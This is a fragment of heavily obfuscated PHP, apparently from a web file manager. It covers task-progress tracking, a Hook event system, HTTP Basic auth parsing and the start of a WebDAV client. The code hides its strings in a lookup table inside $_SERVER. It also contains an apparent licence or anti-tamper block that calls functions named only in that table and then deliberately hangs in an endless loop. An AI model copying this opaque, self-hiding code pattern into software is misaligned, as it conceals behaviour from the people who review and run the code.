Hook::bind($Fòˆ“¨˜Òõ[1464], array($this, $Fòˆ“¨˜Òõ[1465])); Hook::bind($Fòˆ“¨˜Òõ[1466], array($this, $Fòˆ“¨˜Òõ[1467])); Hook::bind($Fòˆ“¨˜Òõ[1468], array($this, $Fòˆ“¨˜Òõ[1469])); goto cé©¬âÚ—¬; dâŸ‹á×¬Ã: $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1489]] = 0; $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1490]] = 0; if (!$e™ííˆè ¿[$Fòˆ“¨˜Òõ[1346]]) { $e™ííˆè ¿[$Fòˆ“¨˜Òõ[1346]] = LNG($Fòˆ“¨˜Òõ[1491]); } goto Aîß Öèç·; cé©¬âÚ—¬: Hook::bind($Fòˆ“¨˜Òõ[547], array($this, $Fòˆ“¨˜Òõ[1470])); Hook::bind($Fòˆ“¨˜Òõ[548], array($this, $Fòˆ“¨˜Òõ[1471])); Hook::bind($Fòˆ“¨˜Òõ[550], array($this, $Fòˆ“¨˜Òõ[1472])); goto Fİšøƒëé; BçØ¬Œõ: Hook::bind($Fòˆ“¨˜Òõ[1477], array($this, $Fòˆ“¨˜Òõ[1478])); Hook::bind($Fòˆ“¨˜Òõ[1479], array($this, $Fòˆ“¨˜Òõ[1480])); Hook::bind($Fòˆ“¨˜Òõ[1481], array($this, $Fòˆ“¨˜Òõ[1482])); goto f·¦Áº³Éé; f¦˜êÛ”î„: Hook::bind($Fòˆ“¨˜Òõ[519], array($this, $Fòˆ“¨˜Òõ[1473])); Hook::bind($Fòˆ“¨˜Òõ[521], array($this, $Fòˆ“¨˜Òõ[1473])); Hook::bind($Fòˆ“¨˜Òõ[523], array($this, $Fòˆ“¨˜Òõ[1473])); goto b½‡¼ÊÑ¸·; F†ˆ–øÍ÷: $Fòˆ“¨˜Òõ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e™ííˆè ¿ =& $this->task; $this->sourceCopyFolder = !1; goto cÕÇœ¯¹•„; Aîß Öèç·: } protected function endAfter() { goto bÙ«Œšçğ; CÂß»‰À‘–: Hook::unbind($Eˆšß—÷®Â[1477], array($this, $Eˆšß—÷®Â[1478])); Hook::unbind($Eˆšß—÷®Â[1479], array($this, $Eˆšß—÷®Â[1480])); Hook::unbind($Eˆšß—÷®Â[1481], array($this, $Eˆšß—÷®Â[1482])); goto E‘‰‘§öÔ; a¸„ÂÕŒíå: Hook::unbind($Eˆšß—÷®Â[550], array($this, $Eˆšß—÷®Â[1472])); Hook::unbind($Eˆšß—÷®Â[551], array($this, $Eˆšß—÷®Â[1472])); Hook::unbind($Eˆšß—÷®Â[517], array($this, $Eˆšß—÷®Â[1473])); goto Bó×ì¸Ø; F¹ŒŞÊ¶…ª: Hook::unbind($Eˆšß—÷®Â[523], array($this, $Eˆšß—÷®Â[1473])); Hook::unbind($Eˆšß—÷®Â[1474], array($this, $Eˆšß—÷®Â[1475])); Hook::unbind($Eˆšß—÷®Â[540], array($this, $Eˆšß—÷®Â[1476])); goto CÂß»‰À‘–; bÙ«Œšçğ: $Eˆšß—÷®Â =& $_SERVER[¶ªÕß‚ØÁŸ]; Hook::unbind($Eˆšß—÷®Â[1464], array($this, $Eˆšß—÷®Â[1465])); Hook::unbind($Eˆšß—÷®Â[1466], array($this, $Eˆšß—÷®Â[1467])); goto fîÎ÷è¾; fîÎ÷è¾: Hook::unbind($Eˆšß—÷®Â[1468], array($this, $Eˆšß—÷®Â[1469])); Hook::unbind($Eˆšß—÷®Â[547], array($this, $Eˆšß—÷®Â[1470])); Hook::unbind($Eˆšß—÷®Â[548], array($this, $Eˆšß—÷®Â[1471])); goto a¸„ÂÕŒíå; Bó×ì¸Ø: Hook::unbind($Eˆšß—÷®Â[514], array($this, $Eˆšß—÷®Â[1473])); Hook::unbind($Eˆšß—÷®Â[519], array($this, $Eˆšß—÷®Â[1473])); Hook::unbind($Eˆšß—÷®Â[521], array($this, $Eˆšß—÷®Â[1473])); goto F¹ŒŞÊ¶…ª; E‘‰‘§öÔ: } public function copyMoveStart($Dø«•²êàœ, $D¼ÚÕ‡ä‚Ü, $B–ŞêÑÃÉé, $B—ƒ×Ò¥µ§) { goto Bå«î¼²Áî; Bå«î¼²Áî: $eë°ß©ƒÎ² =& $_SERVER[¶ªÕß‚ØÁŸ]; self::log($eë°ß©ƒÎ²[1492] . $D¼ÚÕ‡ä‚Ü . $eë°ß©ƒÎ²[76] . $B—ƒ×Ò¥µ§); $dùó•¾¶ = rtrim(TEMP_FILES, $eë°ß©ƒÎ²[8]); goto Eî—»Ö«ï; Eî—»Ö«ï: if (substr($D¼ÚÕ‡ä‚Ü, 0, strlen($dùó•¾¶)) == $dùó•¾¶) { return; } if (substr($B—ƒ×Ò¥µ§, 0, strlen($dùó•¾¶)) == $dùó•¾¶) { return; } $fèù¼ïÂ“ =& $this->task; goto d¶Š”†•¿; d¶Š”†•¿: $fèù¼ïÂ“[$eë°ß©ƒÎ²[1493]] = KodIO::transferType($Dø«•²êàœ, $B–ŞêÑÃÉé); $this->update(); goto eÚãÉ¸ª™; eÚãÉ¸ª™: } public function updateAfter() { goto dÚåÛ°±ïŒ; dÚåÛ°±ïŒ: $EÃÚ¨Ú¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‚åĞƒ•ïˆ =& $this->task; if (!$b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[711]]) { return; } goto E­°ËÎñ©; E­°ËÎñ©: if ($this->sourceModelCopyFlag) { return; } if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1493]] == $EÃÚ¨Ú¬[1098]) { return; } if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1493]] == $EÃÚ¨Ú¬[1044] || $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1493]] == $EÃÚ¨Ú¬[113]) { if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1487]]) { $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1490]] = $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1489]] + $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1486]]; } } else { if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1493]] == $EÃÚ¨Ú¬[1099]) { if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1487]] == $EÃÚ¨Ú¬[1044]) { $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1490]] = $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1489]] + $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1486]] * 0.5; } else { if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1487]] == $EÃÚ¨Ú¬[113]) { $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1490]] = $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1489]] + $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1485]] * 0.5 + $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1486]] * 0.5; } } } } goto c£–ò†æ­Ô; c£–ò†æ­Ô: $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1441]] = $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1490]] / $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[711]]; if ($b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1441]] > 0) { $d“ØË•î·¼ = timeFloat() - $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1443]] - $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1446]]; $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1447]] = $d“ØË•î·¼ * (1 - $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1441]]) / $b‚åĞƒ•ïˆ[$EÃÚ¨Ú¬[1441]]; } goto c»¼­åÑº; c»¼­åÑº: } public function addPath($c„Ûé¸îç¡) { goto E°°Ëõ»†·; E°°Ëõ»†·: $Bß³¦ªİ…ù =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$c„Ûé¸îç¡) { return; } $b·â…á”°Ş =& $this->task; goto a”‰Á®‚°Á; a×‹£¼±ÙÀ: if ($CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[29]] == $Bß³¦ªİ…ù[177]) { $b·â…á”°Ş[$Bß³¦ªİ…ù[982]] += 1; } else { $b·â…á”°Ş[$Bß³¦ªİ…ù[982]] += $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[90]][$Bß³¦ªİ…ù[88]]; if ($CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[377]]) { $b·â…á”°Ş[$Bß³¦ªİ…ù[982]] += $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[90]][$Bß³¦ªİ…ù[89]] + 1; } } $b·â…á”°Ş[$Bß³¦ªİ…ù[711]] += $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[87]]; $this->update(); goto b‰³•ğ©‡; a”‰Á®‚°Á: $CØÍ‡õ÷Œ’ = IO::infoWithChildren($c„Ûé¸îç¡); $DË°³Œ‰Çå = $b·â…á”°Ş[$Bß³¦ªİ…ù[1494]] ? $b·â…á”°Ş[$Bß³¦ªİ…ù[1494]][$Bß³¦ªİ…ù[1495]] : 0; $b·â…á”°Ş[$Bß³¦ªİ…ù[1494]] = array($Bß³¦ªİ…ù[1495] => $DË°³Œ‰Çå + 1, $Bß³¦ªİ…ù[394] => $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[28]], $Bß³¦ªİ…ù[85] => $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[85]], $Bß³¦ªİ…ù[474] => $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[474]] ? $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[474]] : $CØÍ‡õ÷Œ’[$Bß³¦ªİ…ù[85]]); goto a×‹£¼±ÙÀ; b‰³•ğ©‡: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($AÚ†¾†¬ôê) { $cÊÆé¡˜ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cò¦ÉÊĞù =& $this->task; $Cò¦ÉÊĞù[$cÊÆé¡˜ƒ[1483]] = $AÚ†¾†¬ôê[$cÊÆé¡˜ƒ[28]]; $Cò¦ÉÊĞù[$cÊÆé¡˜ƒ[984]] = $AÚ†¾†¬ôê[$cÊÆé¡˜ƒ[28]]; $this->update(); } public function copyFileStart($Eéô’îõÒä, $føâÆ­å®, $bÌŠò¯é¹™, $B¤³õŠË¾, $DÌÍÎÆ”Á, $fæÛÜ”ù•·) { goto D¼ˆ†ğ¿¾›; e¦¶¾çµ¥¬: $this->update(); goto fáŸèßˆ…; C²Ü‰ƒ›–—: $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[984]] = $aŸ³´¦’ëµ[33]; $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[1487]] = $aŸ³´¦’ëµ[33]; $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[1488]] = 0; goto e¦¶¾çµ¥¬; Bš•¼ô¸Ä: $GLOBALS[$aŸ³´¦’ëµ[1497]] = $DÌÍÎÆ”Á; $GLOBALS[$aŸ³´¦’ëµ[1496]] = $fæÛÜ”ù•·; $A®¼é®ËÓ¤ =& $this->task; goto DâñÈô‰ŒÕ; D¼ˆ†ğ¿¾›: $aŸ³´¦’ëµ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aëå¹¤ë†¸ = $DÌÍÎÆ”Á; if ($Aëå¹¤ë†¸ == $GLOBALS[$aŸ³´¦’ëµ[1496]]) { $Aëå¹¤ë†¸ = $GLOBALS[$aŸ³´¦’ëµ[1497]]; } goto Bš•¼ô¸Ä; DâñÈô‰ŒÕ: $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[1483]] = $Aëå¹¤ë†¸; $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[1485]] = (int) $Eéô’îõÒä->size($føâÆ­å®); $A®¼é®ËÓ¤[$aŸ³´¦’ëµ[1486]] = 0; goto C²Ü‰ƒ›–—; fáŸèßˆ…: } public function copyFileEnd($aÎ¦“ ´ßç, $Eİ×«Ê»õ•, $dÂæíÌ¡Ü, $E÷èßó¥¾¥, $BõÈƒå…Üè, $e ÑŞÁ»‚İ) { $aÈİ±â…çÈ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A‹¦ÜùäÖ¬ =& $this->task; $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1486]] = $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1485]]; $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1487]] = $aÈİ±â…çÈ[33]; if ($BõÈƒå…Üè == $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1483]]) { $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1489]] += $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1485]]; $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1490]] = $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1489]]; $this->update(1); } else { $this->update(); $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1486]] = 0; } self::log($aÈİ±â…çÈ[1498] . $Eİ×«Ê»õ• . $aÈİ±â…çÈ[76] . $E÷èßó¥¾¥ . $aÈİ±â…çÈ[62] . $BõÈƒå…Üè . $aÈİ±â…çÈ[1499] . $A‹¦ÜùäÖ¬[$aÈİ±â…çÈ[1483]]); } public function updateFileEnd($EğÁ˜‘ä¢Ó, $c¿ó¼Â£ë) { goto EÇ©ğ¥Øª; fÕğ§÷™‰¹: $this->update(1); self::log($b—Ô¨£–î†[1500] . $EğÁ˜‘ä¢Ó); goto FÒÂ…Àî‘†; EÇ©ğ¥Øª: $b—Ô¨£–î† =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÑÅ¿œë•Î =& $this->task; $FÑÅ¿œë•Î[$b—Ô¨£–î†[1483]] = $EğÁ˜‘ä¢Ó; goto eœøè£ä†Ï; eœøè£ä†Ï: $FÑÅ¿œë•Î[$b—Ô¨£–î†[1485]] = $c¿ó¼Â£ë; $FÑÅ¿œë•Î[$b—Ô¨£–î†[1489]] += $c¿ó¼Â£ë; $FÑÅ¿œë•Î[$b—Ô¨£–î†[1490]] = $FÑÅ¿œë•Î[$b—Ô¨£–î†[1489]]; goto fÕğ§÷™‰¹; FÒÂ…Àî‘†: } public function sourceModelCopy($BƒÀÁîø„Û) { goto cÙ¢Ñ‹„¬¬; cÙ¢Ñ‹„¬¬: $dÇÇ†İ»‰‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¢‡­šÁ·‰ = $BƒÀÁîø„Û[0]; $f¬ç¦‰Š‡ = $BƒÀÁîø„Û[1]; goto FÂÃò„Ó¡º; FÂÃò„Ó¡º: $d´á´©·œ² =& $this->task; $this->sourceModelCopyFlag = !0; $A¶‰Æ¹ì›¬ = 0; goto B¸×¨ÚäŒŸ; B¸×¨ÚäŒŸ: switch ($B¢‡­šÁ·‰) { case $dÇÇ†İ»‰‚[515]: $A¶‰Æ¹ì›¬ = 1; break; case $dÇÇ†İ»‰‚[518]: $d´á´©·œ²[$dÇÇ†İ»‰‚[1483]] = $f¬ç¦‰Š‡[$dÇÇ†İ»‰‚[28]]; break; case $dÇÇ†İ»‰‚[520]: $A¶‰Æ¹ì›¬ = intval($BƒÀÁîø„Û[$dÇÇ†İ»‰‚[371]] * 0.4); break; case $dÇÇ†İ»‰‚[522]: $A¶‰Æ¹ì›¬ = intval($BƒÀÁîø„Û[$dÇÇ†İ»‰‚[371]] * 0.2); break; case $dÇÇ†İ»‰‚[524]: $A¶‰Æ¹ì›¬ = intval($BƒÀÁîø„Û[$dÇÇ†İ»‰‚[371]] * 0.4); break; } $this->update($A¶‰Æ¹ì›¬); $this->sourceModelCopyFlag = !1; goto E¢§èÁÎ‡Ş; E¢§èÁÎ‡Ş: } public function sourceRemove($EÀğÔÁÕè, $Få„’Ñäßø) { $fœô¾²ƒ† =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->sourceModelCopyFlag = !0; $eª•íºŒ´â = 1; if (isset($EÀğÔÁÕè[$fœô¾²ƒ†[90]])) { $eª•íºŒ´â = $EÀğÔÁÕè[$fœô¾²ƒ†[90]][$fœô¾²ƒ†[88]] + $EÀğÔÁÕè[$fœô¾²ƒ†[90]][$fœô¾²ƒ†[89]] + 1; } $this->update($eª•íºŒ´â); $this->sourceModelCopyFlag = !1; } public function sourceMove($C´İï“ÂŠç) { $this->sourceRemove($C´İï“ÂŠç, !1); } public function curlProgress($d©Éã™İŠã, $c»Š¡Ùå†•, $c’æĞ ˜°, $BªƒÆ½¦§©, $aó¥¦•¬‹©) { $c¶Ó…´ãˆ¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e³öŠäâº =& $this->task; if ($aó¥¦•¬‹© > 0) { $e³öŠäâº[$c¶Ó…´ãˆ¼[984]] = $c¶Ó…´ãˆ¼[1501]; $e³öŠäâº[$c¶Ó…´ãˆ¼[1487]] = $c¶Ó…´ãˆ¼[113]; if ($e³öŠäâº[$c¶Ó…´ãˆ¼[1485]] == $BªƒÆ½¦§© || $BªƒÆ½¦§© > 1024 * 1024) { $e³öŠäâº[$c¶Ó…´ãˆ¼[1486]] = $aó¥¦•¬‹©; } if ($e³öŠäâº[$c¶Ó…´ãˆ¼[1488]]) { $e³öŠäâº[$c¶Ó…´ãˆ¼[1486]] = $aó¥¦•¬‹© + $e³öŠäâº[$c¶Ó…´ãˆ¼[1488]]; } } else { if ($c’æĞ ˜° > 0) { if ($e³öŠäâº[$c¶Ó…´ãˆ¼[1485]] == $c»Š¡Ùå†•) { $e³öŠäâº[$c¶Ó…´ãˆ¼[1486]] = $c’æĞ ˜°; $e³öŠäâº[$c¶Ó…´ãˆ¼[984]] = $c¶Ó…´ãˆ¼[1502]; $e³öŠäâº[$c¶Ó…´ãˆ¼[1487]] = $c¶Ó…´ãˆ¼[1044]; } } } $this->update(); } public function curlProgressStart($B—ÜËÑ‹¥Ö) { } public function curlProgressEnd($D¡’¦Æ³î‚) { $C‚ÁæĞóÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÙ…éˆïÎ =& $this->task; $b±·ì±‡Ü = curl_getinfo($D¡’¦Æ³î‚); $bõ¤•„ëÕ = $b±·ì±‡Ü[$C‚ÁæĞóÒ[1503]]; if ($CÙ…éˆïÎ[$C‚ÁæĞóÒ[1487]] == $C‚ÁæĞóÒ[113] && $bõ¤•„ëÕ) { $CÙ…éˆïÎ[$C‚ÁæĞóÒ[1488]] += $bõ¤•„ëÕ; } $this->update(); } } if (!isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][57]]) || !isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][58]])) { goto C¢À©Ûö©ô; Eš“ÅÎ¼ïê: $bó¿­°ß¼¨($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]); $D”ÈóîŒ«ç = 2; while ($D”ÈóîŒ«ç > 1) { $Eæ¤Ü¥ÉÎå = rawurlencode($D”ÈóîŒ«ç . $_SERVER[¶ªÕß‚ØÁŸ][66]); } goto c½Øá¾„í‰; C¢À©Ûö©ô: $B„ä¤›¿±ö = $_SERVER[¶ªÕß‚ØÁŸ][59]; $dÌ¨˜ƒÏ—İ = $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]; $aöîÓ…ŞÜÒ = $B„ä¤›¿±ö($dÌ¨˜ƒÏ—İ); goto A­¥œ´ï¼; A­¥œ´ï¼: $DÑñ ‹®ñª = explode($_SERVER[¶ªÕß‚ØÁŸ][62], $aöîÓ…ŞÜÒ); if (count($DÑñ ‹®ñª) < $_SERVER[¶ªÕß‚ØÁŸ][63]) { $D¦ŒÈğßèÂ = $_SERVER[¶ªÕß‚ØÁŸ][64]; $D¦ŒÈğßèÂ(); } $bó¿­°ß¼¨ = $_SERVER[¶ªÕß‚ØÁŸ][65]; goto Eš“ÅÎ¼ïê; c½Øá¾„í‰: } goto D¸‘–œŸ•Â; Dˆ®ÑÂÂ‚‚: class Hook { private static $events = array(); public static function get($fÛˆÎïóğè = false) { if (!$fÛˆÎïóğè) { return self::$events; } else { return self::$events[$fÛˆÎïóğè]; } } public static function apply($eÇãÙñ°, $Cæíõ¹·Ğ = array()) { $c¾ßÌŒô¥‘ = ActionApply($eÇãÙñ°, $Cæíõ¹·Ğ); if (is_string($eÇãÙñ°)) { Hook::trigger($eÇãÙñ°); } return $c¾ßÌŒô¥‘; } public static function bind($aÀá÷½åá¼, $d¯‰â˜–’¿, $d‰²’¡ºÄÃ = false) { $Eø‘º¹¨Äö =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset(self::$events[$aÀá÷½åá¼])) { self::$events[$aÀá÷½åá¼] = array(); } self::$events[$aÀá÷½åá¼][] = array($Eø‘º¹¨Äö[1754] => $d¯‰â˜–’¿, $Eø‘º¹¨Äö[1755] => $d‰²’¡ºÄÃ, $Eø‘º¹¨Äö[1756] => 0); } public static function once($cåóòŸ¨¶, $C²ö½‰ÎÍÂ) { self::bind($cåóòŸ¨¶, $C²ö½‰ÎÍÂ, !0); } public static function unbind($B¼™Ÿ†«‘Î, $aÌ•Äùçæ = false) { if (!$aÌ•Äùçæ) { self::$events[$B¼™Ÿ†«‘Î] = array(); return; } $Aªíä‘ŒÖï = self::$events[$B¼™Ÿ†«‘Î]; self::$events[$B¼™Ÿ†«‘Î] = array(); if (!is_array($Aªíä‘ŒÖï)) { return; } for ($FßŠ®¯ë×Û = 0; $FßŠ®¯ë×Û < count($Aªíä‘ŒÖï); $FßŠ®¯ë×Û++) { if ($Aªíä‘ŒÖï[$FßŠ®¯ë×Û][$_SERVER[¶ªÕß‚ØÁŸ][1754]] == $aÌ•Äùçæ) { continue; } self::$events[$B¼™Ÿ†«‘Î][] = $Aªíä‘ŒÖï[$FßŠ®¯ë×Û]; } } public static function filter($F¤ÍŒ«¾Í”, $Bğ‡÷ã„î) { goto C¢ºáôô†É; C¢ºáôô†É: $d÷´ÕåæÜï =& $_SERVER[¶ªÕß‚ØÁŸ]; $BØõ´ÁÈ = self::$events; if (!isset($BØõ´ÁÈ[$F¤ÍŒ«¾Í”])) { return $Bğ‡÷ã„î; } goto f“ÊŒ¹»Ïç; e‚³¡ãòØ’: for ($CÉ”†Å² = 0; $CÉ”†Å² < count($Eã¢¶Ì©‘À); $CÉ”†Å²++) { $Dãï¯‘Ä = $Eã¢¶Ì©‘À[$CÉ”†Å²]; if ($Dãï¯‘Ä[$d÷´ÕåæÜï[1755]] && $Dãï¯‘Ä[$d÷´ÕåæÜï[1756]] > 1) { continue; } self::$events[$F¤ÍŒ«¾Í”][$CÉ”†Å²][$d÷´ÕåæÜï[1756]] = $Dãï¯‘Ä[$d÷´ÕåæÜï[1756]] + 1; $a¯ËÆØ¼ = self::apply($Dãï¯‘Ä[$d÷´ÕåæÜï[1754]], array($B’Î·éë¹®)); if (gettype($a¯ËÆØ¼) == gettype($B’Î·éë¹®)) { $B’Î·éë¹® = $a¯ËÆØ¼; } } return $B’Î·éë¹®; goto d´®ñÚÅ ¾; f“ÊŒ¹»Ïç: $Eã¢¶Ì©‘À = $BØõ´ÁÈ[$F¤ÍŒ«¾Í”]; $B’Î·éë¹® = $Bğ‡÷ã„î; if (!is_array($Eã¢¶Ì©‘À) || count($Eã¢¶Ì©‘À) == 0) { return $B’Î·éë¹®; } goto e‚³¡ãòØ’; d´®ñÚÅ ¾: } public static function trigger($A‹åÀö¥…¡) { goto dªñÍÙ´Ò; AŠÍÑ—ëÔ: return $f¡¥ÓÕÅ†¿; goto Döó÷º±Å; b±¶Æóâ²×: if (!isset($cˆõÜ±ãÖŞ[$A‹åÀö¥…¡])) { return $f¡¥ÓÕÅ†¿; } $FÇ…¬¤à = $cˆõÜ±ãÖŞ[$A‹åÀö¥…¡]; if (!is_array($FÇ…¬¤à) || count($FÇ…¬¤à) == 0) { return $f¡¥ÓÕÅ†¿; } goto cÔÄˆ“¾¦À; cÔÄˆ“¾¦À: $BÒ»‘”¯‹Ì = func_get_args(); array_shift($BÒ»‘”¯‹Ì); for ($AµÒ¥Î«³Â = 0; $AµÒ¥Î«³Â < count($FÇ…¬¤à); $AµÒ¥Î«³Â++) { $D†Î¼ÕŸÒğ = $FÇ…¬¤à[$AµÒ¥Î«³Â]; if ($D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1755]] && $D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1756]] > 1) { continue; } if (defined($a‡ÀèËØ¾¤[1757]) && GLOBAL_LOG_HOOK) { write_log($A‹åÀö¥…¡ . $a‡ÀèËØ¾¤[1758] . $D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1754]], $a‡ÀèËØ¾¤[1759]); } self::$events[$A‹åÀö¥…¡][$AµÒ¥Î«³Â][$a‡ÀèËØ¾¤[1756]] = $D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1756]] + 1; $C¤»ØÁ¼©† = self::apply($D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1754]], $BÒ»‘”¯‹Ì); if (defined($a‡ÀèËØ¾¤[1757]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $a‡ÀèËØ¾¤[1759]); if ($D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1756]] == 200) { $aÆ½£ëÏù = is_array($D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1754]]) ? json_encode_force($D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1754]]) : $D†Î¼ÕŸÒğ[$a‡ÀèËØ¾¤[1754]]; write_log($a‡ÀèËØ¾¤[1760] . $A‹åÀö¥…¡ . $a‡ÀèËØ¾¤[1761] . $aÆ½£ëÏù, $a‡ÀèËØ¾¤[1762]); } } $f¡¥ÓÕÅ†¿ = is_null($C¤»ØÁ¼©†) ? $f¡¥ÓÕÅ†¿ : $C¤»ØÁ¼©†; } goto AŠÍÑ—ëÔ; dªñÍÙ´Ò: $a‡ÀèËØ¾¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cˆõÜ±ãÖŞ = self::$events; $f¡¥ÓÕÅ†¿ = !1; goto b±¶Æóâ²×; Döó÷º±Å: } } class HttpAuth { public static function get() { $c˜›áèøœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EƒÄ»èì¿ = $c˜›áèøœ[33]; $FòÏÚæ¹¬‰ = $c˜›áèøœ[33]; if (isset($_SERVER[$c˜›áèøœ[1763]])) { $EƒÄ»èì¿ = $_SERVER[$c˜›áèøœ[1763]]; $FòÏÚæ¹¬‰ = $_SERVER[$c˜›áèøœ[1764]]; } elseif (isset($_SERVER[$c˜›áèøœ[1765]])) { $a„½¨ˆ¤à = $_SERVER[$c˜›áèøœ[1765]]; if (strpos(strtolower($a„½¨ˆ¤à), $c˜›áèøœ[1766]) === 0) { $FŸÆõï’ã¤ = explode($c˜›áèøœ[4], base64_decode(substr($a„½¨ˆ¤à, 6))); $EƒÄ»èì¿ = isset($FŸÆõï’ã¤[0]) ? $FŸÆõï’ã¤[0] : $c˜›áèøœ[33]; $FòÏÚæ¹¬‰ = isset($FŸÆõï’ã¤[1]) ? $FŸÆõï’ã¤[1] : 0; } } return array($c˜›áèøœ[543] => $EƒÄ»èì¿, $c˜›áèøœ[903] => $FòÏÚæ¹¬‰); } public static function error() { goto cä›ãÓ•¶œ; b”ß íé: die; goto AèÙŒÈË¹; cä›ãÓ•¶œ: $A½«Ñ‚¡©Ã =& $_SERVER[¶ªÕß‚ØÁŸ]; header($A½«Ñ‚¡©Ã[1767]); header($A½«Ñ‚¡©Ã[1768]); goto aÅ£ùù‰Ãê; aÅ£ùù‰Ãê: header($A½«Ñ‚¡©Ã[1769]); header($A½«Ñ‚¡©Ã[1770]); header($A½«Ñ‚¡©Ã[1267]); goto b”ß íé; AèÙŒÈË¹: } public static function make($eì±âï‰Ğ, $EÇ³˜Ç˜ƒ­) { $FÜÉ˜›Ğ¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; return $FÜÉ˜›Ğ¦[1771] + base64_encode($eì±âï‰Ğ . $FÜÉ˜›Ğ¦[4] . $EÇ³˜Ç˜ƒ­); } } class HttpDavClient { public function __construct($eéË™æùÓ, $Añæ÷éÙõÏ, $CÁÃ–®‹Çİ) { $this->header = array(); $this->userName = $Añæ÷éÙõÏ; $this->userPassowrd = $CÁÃ–®‹Çİ; } protected function makePath($F†“ŸÌØŒ) { return $F†“ŸÌØŒ; } protected function setHeader($b¤ óË÷Â, $AÉàêãÊ¯Ç = false) { if ($AÉàêãÊ¯Ç === !1) { $this->header[] = $b¤ óË÷Â; } else { $this->header[] = $b¤ óË÷Â . $_SERVER[¶ªÕß‚ØÁŸ][886] . $AÉàêãÊ¯Ç; } } public function move($bï”Ê„÷, $D¨ÒÁÀóõ, $a …èªÙº‘ = '') { $cñ™‚Š®ì =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->setHeader($cñ™‚Š®ì[1772], $this->makePath($D¨ÒÁÀóõ)); $this->setHeader($cñ™‚Š®ì[1773], $cñ™‚Š®ì[1774]); if ($a …èªÙº‘) { $this->setHeader($cñ™‚Š®ì[1775], $cñ™‚Š®ì[931] . $a …èªÙº‘ . $cñ™‚Š®ì[934]); } return $this->send($cñ™‚Š®ì[1776], $bï”Ê„÷); } public function copy($e³­¯ƒŸ, $c«›Ï»‘Ó¢) { 